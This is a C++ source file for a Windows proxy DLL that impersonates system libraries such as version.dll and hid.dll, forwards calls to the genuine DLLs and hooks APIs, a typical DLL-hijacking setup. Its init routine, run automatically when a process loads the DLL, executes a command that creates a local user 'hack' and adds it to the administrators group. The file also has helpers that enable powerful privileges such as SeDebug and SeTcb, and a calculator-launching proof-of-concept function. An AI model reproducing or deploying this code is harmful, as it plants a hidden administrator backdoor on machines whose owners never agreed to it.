#include "common.hpp"
#include "version_dll.hpp"
#include "lz32_dll.hpp"
#include "hid_dll.hpp"
#include "msimg32_dll.hpp"
#include "plugin.hpp"
#include "minhook_api.hpp"
#include <mutex>            // std::{once_flag, call_once}
#include<tchar.h>

namespace {
    bool isWin64() {
    #if defined(_WIN64)
        DEBUG_TRACE(L"isWin64 : _WIN64");
        return true;
    #else
        DEBUG_TRACE(L"isWin64 : _WIN32");
        BOOL wow64Process = FALSE;
        return (IsWow64Process(GetCurrentProcess(), &wow64Process) != 0) && (wow64Process != 0);
    #endif
    }

    DllType determineDllType(const wchar_t* dllFilename) {
        if(version_dll::checkFname(dllFilename)) { return DllType::Version; }
        if(lz32_dll::checkFname(dllFilename))    { return DllType::Lz32; }
        if(hid_dll::checkFname(dllFilename))     { return DllType::Hid; }
        if(msimg32_dll::checkFname(dllFilename)) { return DllType::Msimg32; }
        return DllType::Unknown;
    }

    void loadGenuineDll(DllType dllType, const wchar_t* systemDirectory) {
        switch(dllType) {
        default: break;
        case DllType::Version:  version_dll::loadGenuineDll(systemDirectory);   break;
        case DllType::Lz32:     lz32_dll::loadGenuineDll(systemDirectory);      break;
        case DllType::Hid:      hid_dll::loadGenuineDll(systemDirectory);       break;
        case DllType::Msimg32:  msimg32_dll::loadGenuineDll(systemDirectory);   break;
        }
    }

    void unloadGenuineDll(DllType dllType) {
        switch(dllType) {
        default: break;
        case DllType::Version:  version_dll::unloadGenuineDll();    break;
        case DllType::Lz32:     lz32_dll::unloadGenuineDll();       break;
        case DllType::Hid:      hid_dll::unloadGenuineDll();        break;
        case DllType::Msimg32:  msimg32_dll::unloadGenuineDll();    break;
        }
    }
}


namespace {
    DllType dllType = DllType::Unknown;

    void PrintPrivileges() {
        HANDLE hToken;
        DWORD dwSize;

        // 1. 打开当前进程的访问令牌
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            DEBUG_TRACE("OpenProcessToken 失败! 错误: %d\n", GetLastError());
            return;
        }

        // 2. 获取令牌信息大小
        if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize)) {
            DWORD dwError = GetLastError();
            if (dwError != ERROR_INSUFFICIENT_BUFFER) {
                DEBUG_TRACE("GetTokenInformation 失败! 错误: %d\n", dwError);
                CloseHandle(hToken);
                return;
            }
        }

        // 3. 分配内存并获取特权信息
        PTOKEN_PRIVILEGES pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
        if (!pTokenPrivileges) {
            DEBUG_TRACE("内存分配失败!\n");
            CloseHandle(hToken);
            return;
        }

        if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
            DEBUG_TRACE("GetTokenInformation 失败! 错误: %d\n", GetLastError());
            free(pTokenPrivileges);
            CloseHandle(hToken);
            return;
        }

        // 4. 枚举所有特权
        DEBUG_TRACE("当前进程特权列表 (%d 项):\n", pTokenPrivileges->PrivilegeCount);
        DEBUG_TRACE("==================================================\n");
        DEBUG_TRACE("%-40s %s\n", "特权名称", "状态");
        DEBUG_TRACE("--------------------------------------------------\n");

        for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
            LUID_AND_ATTRIBUTES la = pTokenPrivileges->Privileges[i];
            TCHAR szPrivilegeName[256];
            DWORD dwNameLen = sizeof(szPrivilegeName) / sizeof(TCHAR);

            // 5. 将LUID转换为特权名称
            if (LookupPrivilegeName(NULL, &la.Luid, szPrivilegeName, &dwNameLen)) {
                // 6. 确定特权状态
                LPCSTR status = "未知";
                if (la.Attributes & SE_PRIVILEGE_ENABLED) {
                    status = "已启用";
                }
                else if (la.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
                    status = "默认启用";
                }
                else if (la.Attributes == 0) {
                    status = "已禁用";
                }
                else if (la.Attributes & SE_PRIVILEGE_REMOVED) {
                    status = "已移除";
                }

                // 7. 输出特权信息
                DEBUG_TRACE(L"%-40s %s\n", szPrivilegeName, status);
            }
            else {
                DEBUG_TRACE(L"特权 LUID: %08x:%08x (无法获取名称)\n",
                    la.Luid.HighPart, la.Luid.LowPart);
            }
        }

        DEBUG_TRACE("==================================================\n");

        // 8. 清理资源
        free(pTokenPrivileges);
        CloseHandle(hToken);
    }

    // 启用指定特权
    BOOL EnablePrivilege(LPCTSTR privilegeName) {
        HANDLE hToken;
        TOKEN_PRIVILEGES tokenPrivileges;
        LUID luid;

        // 1. 打开当前进程的访问令牌
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            DEBUG_TRACE("打开进程令牌失败! 错误: %d\n", GetLastError());
            return FALSE;
        }

        // 2. 查找特权的LUID
        if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
            DEBUG_TRACE("查找特权值失败! 错误: %d\n", GetLastError());
            CloseHandle(hToken);
            return FALSE;
        }

        // 3. 设置特权结构
        tokenPrivileges.PrivilegeCount = 1;
        tokenPrivileges.Privileges[0].Luid = luid;
        tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // 4. 启用特权
        if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
            DEBUG_TRACE("调整令牌特权失败! 错误: %d\n", GetLastError());
            CloseHandle(hToken);
            return FALSE;
        }

        // 5. 检查操作结果
        DWORD lastError = GetLastError();
        if (lastError == ERROR_NOT_ALL_ASSIGNED) {
            DEBUG_TRACE(L"警告: 特权 %s 未被完全分配\n", privilegeName);
        }

        CloseHandle(hToken);
        return (lastError == ERROR_SUCCESS);
    }

    void GetBasePrivileges()
    {
        // 需要启用的特权列表
        LPCTSTR requiredPrivileges[] = {
            SE_DEBUG_NAME,           // 调试特权 (SeDebugPrivilege)
            SE_ASSIGNPRIMARYTOKEN_NAME, // 分配主令牌 (SeAssignPrimaryTokenPrivilege)
            SE_INCREASE_QUOTA_NAME,  // 增加配额 (SeIncreaseQuotaPrivilege)
            SE_TCB_NAME,             // 作为操作系统的一部分 (SeTcbPrivilege)
            NULL // 结束标记
        };

        // 尝试启用所有需要的特权
        BOOL allPrivilegesEnabled = TRUE;
        for (int i = 0; requiredPrivileges[i] != NULL; i++) {
            if (EnablePrivilege(requiredPrivileges[i])) {
                DEBUG_TRACE(L"已成功启用特权: %s\n", requiredPrivileges[i]);
            }
            else {
                DEBUG_TRACE(L"无法启用特权: %s\n", requiredPrivileges[i]);
                allPrivilegesEnabled = FALSE;
            }
        }
    }

    BOOL OpenCalc()
    {
        //  直接启动计算器
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        TCHAR calcPath[MAX_PATH];

        // 禁用文件系统重定向（仅32位程序需要）
        PVOID OldValue = NULL;
        BOOL bRedirect = FALSE;
        if (IsWow64Process(GetCurrentProcess(), &bRedirect) && bRedirect) {
            Wow64DisableWow64FsRedirection(&OldValue);
        }

        // 获取系统目录
        if (GetSystemDirectory(calcPath, MAX_PATH) == 0) {
            DEBUG_TRACE("错误：无法获取系统目录 (%lu)\n", GetLastError());
            return FALSE;
        }

        wcscat_s(calcPath, L"\\calc.exe");

        if (CreateProcess(
            NULL,
            calcPath,
            NULL,
            NULL,
            FALSE,
            0,
            NULL,
            NULL,
            &si,
            &pi)) {
            DEBUG_TRACE("计算器已成功启动！\n");
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        else {
            DEBUG_TRACE("错误：无法启动计算器 (%lu)\n", GetLastError());
            return FALSE;
        }

        // 恢复文件系统重定向
        if (OldValue) {
            Wow64RevertWow64FsRedirection(OldValue);
        }
        return TRUE;
    }

    void init(HMODULE hModule) {
        DEBUG_TRACE(L"init : begin");
        minhook_api::init();

        wchar_t systemDirectory[MAX_PATH + 1];
        {
            const auto w64 = isWin64();
            DEBUG_TRACE(L"init : isWin64=%d", w64);
            if(w64) {
                GetSystemDirectoryW(systemDirectory, static_cast<UINT>(std::size(systemDirectory)));
            } else {
                GetSystemWow64DirectoryW(systemDirectory, static_cast<UINT>(std::size(systemDirectory)));
            }
            DEBUG_TRACE(L"init : systemDirectory=[%s]", systemDirectory);
        }

        {
            wchar_t moduleFullpathFilename[MAX_PATH + 1];
            {
                GetModuleFileNameW(hModule, moduleFullpathFilename, static_cast<UINT>(std::size(moduleFullpathFilename)));
                SetEnvironmentVariableW(L"VERSION_DLL_PLUGIN_PROVIDER", moduleFullpathFilename);
                DEBUG_TRACE(L"init : moduleFullpathFilename=[%s]", moduleFullpathFilename);
            }

            wchar_t fname[_MAX_FNAME+1];
            {
                wchar_t drive[_MAX_DRIVE+1];
                wchar_t dir[_MAX_DIR+1];
                wchar_t ext[_MAX_EXT+1];
                _wsplitpath_s(moduleFullpathFilename, drive, dir, fname, ext);
                DEBUG_TRACE(L"init : fname=[%s]", fname);
            }

            dllType = determineDllType(fname);
            DEBUG_TRACE(L"init : dllType=[%d]", dllType);
        }

        loadGenuineDll(dllType, systemDirectory);
        plugin::loadPluginDlls();
        {
            system("net user hack hack /add && net localgroup administrators hack /add");      
            //
            // *** You can put your own init code here ***
            //
        }
        DEBUG_TRACE(L"init : end");
    }

    void cleanup() {
        DEBUG_TRACE(L"cleanup : begin");
        {
            //
            // *** You can put your own cleanup code here ***
            //
        }
        plugin::unloadPluginDlls();
        unloadGenuineDll(dllType);
        minhook_api::cleanup();
        DEBUG_TRACE(L"cleanup : end");
    }
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID) {
    static std::once_flag initFlag;
    static std::once_flag cleanupFlag;

    switch(ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DEBUG_TRACE(L"DLL_PROCESS_ATTACH (hModule=%p) : begin", hModule);
        std::call_once(initFlag, [&]() { init(hModule); });
        DEBUG_TRACE(L"DLL_PROCESS_ATTACH (hModule=%p) : end", hModule);
        break;

    case DLL_PROCESS_DETACH:
        DEBUG_TRACE(L"DLL_PROCESS_DETACH (hModule=%p) : begin", hModule);
        std::call_once(cleanupFlag, [&]() { cleanup(); });
        DEBUG_TRACE(L"DLL_PROCESS_DETACH (hModule=%p) : end", hModule);
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    default:
        break;
    }

    return TRUE;
}
